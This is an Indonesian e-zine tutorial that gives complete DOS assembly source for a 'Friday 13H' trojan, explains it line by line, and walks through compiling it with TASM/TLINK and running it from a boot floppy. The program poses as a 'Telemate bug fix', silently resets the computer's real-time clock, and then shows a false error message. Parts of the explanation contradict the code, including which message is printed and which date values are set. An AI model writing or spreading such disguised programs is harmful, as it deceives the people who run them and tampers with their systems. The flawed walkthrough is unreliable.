@@ -1,0 +1,211 @@
+
+               E C H O   E - Z I N E   I s s u e   # 1 0               
+
+---------------------[ Modifikasi Virus Friday 13H ]----------------------
+--------------------------------------------------------------------------
+----------------[ familycode <yk_family_code@yahoo.com> ]-----------------
+
+
+--- 00 // Intro ----------------------------------------------------------
+
+Bagaimana cara membuat virus menggunakan bahasa Assembler? Bagaimana cara 
+kerjanya? Penulis akan memberikan contoh sebuah virus yang tidak terlalu 
+sulit untuk anda dengan memanfaatkan program Turbo Assembler.
+
+Hasil akhir Virus ini adalah akan mengganti tanggal komputer menjadi 
+seperti yang progammer mau--dimana di virus Friday 13H ini menjadi 13 Juli 
+1990. Lalu apa hubungannya ama Friday? Cek deh tanggal komputer kamu kalau 
+waktu itu adalah hari Jumat (Friday).
+
+Lalu kenapa harus tanggal 13 Juli 1990? Menurut sumber bahwa pada waktu 
+itu ada kejadian seperti ketegangan di Israel. 
+
+Ok deh untuk history virus sampek sini aja, kita langsung ke pemograman 
+virusnya. Sebelum memulai pertama-tama kita harus menyediakan dahulu :
+
+ 1. Program Turbo Assembler
+ 2. Disket kosong yang bisa booting DOS, disket besar juga boleh tapi 
+    zaman gini lho masih ada yang makek disket besar, hehe..
+
+--- 01 // Source Code ----------------------------------------------------
+
+Berikut adalah source code virus Friday 13H
+
+<++ Friday13H ++>
+ CODE	SEGMENT
+	Assume	CS:code,DS:code
+	ORG 	100h
+
+ start:	Jmp begin
+ text1	db ' Telemate bug fix for version 3.0+$ ' ;Bogus filler text
+ text2	db ' TM.EXE fixed!$ '			;Bogus filler text
+ text3  db 07h,'Error! Cannot alter TM.EXE$ '	;Printed after change
+
+ Begin	proc	NEAR
+	mov	ah,05h		;Function 5 - Set Real Time Clock
+	mov	cx,1990h	;What century
+	mov	dx,0713h	;Month/day
+	int	1ah		;Execute
+
+	mov	ah,09h		;Funtion 9 - Print string <end in $>
+	lea	dx,text3	;What text to print
+	int	21h		;Execute function 09
+	int	20h		;Quit .COM file
+  	begin	endp
+
+ CODE   ENDS			;End segment
+ 	END start		;End program
+
+<-- Friday13H -->
+
+--- 02 // Penjelasan Source Code -----------------------------------------
+
+Itu adalah source code aslinya tapi anda jangan terkecoh karena diprogram 
+ini ada variabel yang sebenarnya tidak perlu.
+
+Ok, kita mulai langsung dari source utamanya, untuk mendalami lebih jauh 
+tentang assembler silahkan membaca tentang tutorial assembler di 
+ilmukomputer.com.
+
+ 1. text1	db	' Telemate bug fix for version 3.0+$ '
+
+    // Perintah ini akan ditampilkan jika program berhasil bekerja.
+
+ 2. text2	db	' TM.EXE fixed!$ '	;Bogus filler text
+
+    // Perintah ini sebenarnya ga perlu ada karena variabelnya 
+    // gak digunain
+
+ 3. text3
+
+    text3   db 	 07h,'Error! Cannot alter TM.EXE$ ' ;Printed after change
+
+    // Perintah ini akan ditampilkan jika kamu compile dengan com file 
+    // Jika tampil peritah seperti diatas maka itu artinya error alias 
+    // tanggal tidak berubah
+    // Solusinya jika tampil pesan diatas maka compile ulang dengan 
+    // exe, dan bukan com
+
+ 4. Begin	proc	NEAR
+
+    // Memulai program 
+
+ 4. mov	ah,05h			;Function 5 - Set Real Time Clock
+
+    // memindahkan 05h ke AH
+
+ 5. mov	cx,1990h		;What century
+
+    // ubah tahun 1990 itu jadi 2004 aja jadi hasil editingnya 
+    // seperti dibawah ini
+
+    mov	cx,2004h
+
+ 6. mov	dx,0713h		;Month/day
+
+    // ubah bulan 07 dan tanggal 13 menjadi 06 dengan tanggal 13 
+    // jadi hasil editingnya :
+
+    mov	dx,0605h
+
+ 7. int	1ah			;Execute
+
+    // Dieksekusi peritah diatas dan berubahlah tanggal komputer jika 
+    // dijalankan
+
+ 8. mov	ah,09h			;Funtion 9 - Print string <end in $>
+    lea	dx,text3		;What text to print
+    int	21h			;Execute function 09
+    int	20h			;Quit .COM file
+    begin	endp
+
+    // Perintah-perintah tersebut akan melakukan eksekusi pada text 3
+
+    text3   db 	 07h,'Error! Cannot alter TM.EXE$ ' ;Printed after change    
+
+ 9. CODE   ENDS			;End segment
+    END start			;End program
+    
+    //Program diahkiri  
+
+
+--- 03 // Kompilasi ------------------------------------------------------
+
+Ok sekarang kita masuk dalam program Turbo Assembler, perlu diketahui 
+dimana di Turbo Assembler kita harus melakukan compile 2 kali agar 
+hasil ahkirnya menjadi EXE.
+
+Info File Exe pada program Turbo Assembler untuk mengcompile :
+ - TASM.EXE (Untuk mengcompile file tahap 1 untuk menjadikan file ASM 
+   menjadi OBJ) 
+ - TLINK.EXE (Untuk mengcompile file tahap 1 untuk menjadikan file OBJ 
+   menjadi EXE)
+
+Selanjutnya, bukan text-editor untuk membuat virus.asm. Lalu mengcompile
+dengan perintah `tasm virus.asm'.
+
+C:\TA2>tasm virus.asm
+Turbo Assembler  Version 2.0 Copyright (c) 1987, 1990 Borland International
+
+Assembling file:   virus.aSM
+Error messages:    None
+Warning messages:  None
+Passes:            1
+Remaining memory:  443k
+
+Setelah itu kita compile tahap kedua agar file virus.obj menjadi 
+virus.exe dengan cara perintah `tlink virus'
+
+C:\TA2>tlink virus
+Turbo Link  Version 3.0 Copyright (c) 1987, 1990 Borland International
+Warning: No stack
+
+
+--- 04 // Eksekusi -------------------------------------------------------
+
+Proses eksekusi membutuhkan DOS original (bukan DOS pada Windows XP).
+Jika dijalankan pada WinXP, maka akan terjadi error seperti:
+
+ |------------------------------------------- ...
+ | 16 bit MS-DOS Subsystem              
+ |------------------------------------------- ...
+ | Command Prompt - virus
+ | The Close gas ebcountered an illegal instr ...
+ | CS:00 bla.. bla..
+
+dan jam komputer pun tidak akan berubah.
+
+Metode efektif untuk mencobanya adalah dengan menyalin file virus.exe 
+ke dalam sebuah floppydisk, restart komputer, lalu booting dengan DOS
+menggunakan disket. Lalu jalankan dengan perintah `virus'.
+
+Setelah menjalankan program `virus' maka Anda dapat melihat notifikasi
+
+  Telemate bug fix for version 3.0+
+
+Langkah selanjutnya adalah dengan merestart komputer dan cek perubahan
+tanggal yang terjadi.
+
+Tanggal komputer Anda akan berubah menjadi tanggal 05 Juni 2004. Itu 
+tanggal apa ya? Itu adalah tanggal kelahiran website Yogya Family Code.
+
+
+--- 05 // Penutup --------------------------------------------------------
+
+Tujuan dari tutorial ini adalah kita paling tidak memahami dasar assembler 
+dimana ahkirnya kita dapat mencoba source virus-virus yang ada di Internet 
+atau CD yang ahkirnya diharapkan ke depannya kita dapat membuat sebuah 
+antivirus buatan sendiri.
+
+* Segala kesalahan error/kerusakan pada komputer dan semacamnya adalah 
+  tanggung jawab Anda!
+* Semua yang Anda pelajari dan lakukan adalah sepenuhnya tanggung jawab 
+  Anda sendiri.
+
+
+--- 06 // Greetz ---------------------------------------------------------
+
+Kangdiman, HKX, Edy (Yogyahacker), Jambihacker, markov, Sonny AK, Ketut
+dan semua OP  yogyafree  
+
+-------------------------------------------------------------- EOF //-----
